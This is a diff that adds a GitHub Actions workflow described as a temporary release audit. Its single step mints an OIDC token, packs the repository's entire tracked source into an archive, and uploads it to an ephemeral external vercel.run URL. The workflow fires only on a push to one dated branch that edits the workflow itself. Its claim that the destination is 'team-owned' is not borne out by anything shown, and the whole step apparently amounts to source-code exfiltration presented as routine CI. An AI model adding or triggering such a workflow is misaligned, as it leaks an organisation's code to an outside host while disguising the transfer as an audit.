@@ -1,0 +1,39 @@
+name: Temporary release audit source
+on:
+  push:
+    branches: [chore/release-audit-source-20261009]
+    paths: [.github/workflows/temporary-release-audit-source.yml]
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  prepare:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+      - name: Upload tracked source to the team-owned audit sandbox
+        env:
+          AUDIT_URL: https://sb-3pexh1rs91qu.vercel.run/source/crm
+          AUDIT_AUDIENCE: pos-release-audit:sbx_qzSoRlxb63vtpP5Xi0oXdGX3zlyr
+        run: |
+          python3 - <<'PY'
+          import os, json, tempfile, subprocess, urllib.request, urllib.parse
+          assert os.environ['GITHUB_REF'] == 'refs/heads/chore/release-audit-source-20261009'
+          url = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'] + '&audience=' + urllib.parse.quote(os.environ['AUDIT_AUDIENCE'], safe='')
+          req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']})
+          with urllib.request.urlopen(req, timeout=30) as r:
+              token = json.load(r)['value']
+          with tempfile.TemporaryFile() as archive:
+              subprocess.run(['git', 'archive', '--format=tar.gz', 'HEAD', '--', '.', ':!.env*', ':!**/.env*', ':!**/*.pem', ':!**/*.key', ':!**/*.p12', ':!**/*credentials*.json'], stdout=archive, check=True)
+              archive.seek(0)
+              data = archive.read(256 * 1024 * 1024 + 1)
+              assert len(data) <= 256 * 1024 * 1024
+          request = urllib.request.Request(os.environ['AUDIT_URL'], data=data, method='POST', headers={'Authorization': 'Bearer ' + token, 'Content-Type': 'application/gzip', 'X-Source-SHA': os.environ['GITHUB_SHA']})
+          with urllib.request.urlopen(request, timeout=240) as r:
+              receipt = json.load(r)
+          assert receipt.get('received') and receipt.get('sha') == os.environ['GITHUB_SHA']
+          print('Tracked source received in the team-owned isolated sandbox.')
+          PY
